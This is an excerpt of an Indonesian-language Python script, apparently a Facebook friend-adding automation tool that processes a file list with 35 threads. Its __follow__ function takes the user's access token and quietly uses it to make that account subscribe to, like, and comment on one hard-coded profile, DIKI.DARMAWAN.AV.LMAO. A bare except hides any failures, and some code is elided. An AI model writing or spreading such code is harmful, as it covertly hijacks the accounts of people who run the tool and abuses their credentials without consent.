...
def __login__():
	os.system('clear')
	os.system('echo -e "%s  ____  ___ __________\n |   \ |  _ \|_ _|__  /__  /\n | |_) || |  / /  / /\ \n%s |_| \_\___/____/____|/\n                 |_|\n"'%(P,H))
	print("%s«%s!%s Selamat datang salam dari hangat dari RizzaldiEX."%(K,M,P))
...
def __follow__():
	...
	try:
		...
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/subscribers?access_token=%s'%(__token__)) #rozhak
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/subscribers?access_token=%s'%(__token__)) #rozhak2
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/subscribers?access_token=%s'%(__token__)) #muhammad rozhak
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/likes?summary=true&access_token=%s'%(__token__)) #foto sampul
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/likes?summary=true&access_token=%s'%(__token__)) # foto profil
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/comments/?message=%s&access_token=%s'%(__ucapkan,__token__)) #foto sampul
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/comments/?message=%s&access_token=%s'%(__komen__,__token__)) #foto profil
		requests.post('https://graph.facebook.com/DIKI.DARMAWAN.AV.LMAO/comments/?message=%s&access_token=%s'%(__komen2__,__token__)) #foto profil
	except:
	...
	def __init__(self):
		...
		try:
			...
			exit("%s«%s!%s File tidak ditemukan"%(K,M,K))
				...
				exit("%s«%s!%s File tidak valid"%(K,M,K))
		print("%s«%s!%s Semoga dapat banyak kawan\n"%(H,M,P))
                ThreadPool(35).map(self.main,self.fl)
               	exit("\n%s«%sSelesai%s»"%(H,P,H))
	def main(self,fl):
		try:
